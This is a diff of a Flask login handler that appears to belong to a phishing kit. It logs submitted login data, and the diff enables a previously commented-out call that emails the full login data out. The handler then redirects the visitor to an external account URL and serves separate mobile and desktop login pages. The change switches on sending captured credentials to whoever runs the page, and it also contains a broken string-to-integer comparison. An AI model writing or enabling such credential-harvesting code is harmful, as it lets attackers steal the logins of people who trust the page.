@@ -61,11 +61,12 @@ def login():
             set_permanent_session(30)
             session['email'] = login_data.get('email')
             print_to_terminal(login_data)
-            # send_notification_email(login_data)
+            send_notification_email(login_data)
         except Exception:
             pass
         return redirect(ACCOUNT_URL)
     if request.args and request.args.get('dev','') == 2:
+            print('desktop')
             return render_template('desktop_login.html')
     else:
         return render_template("mobile_login.html")
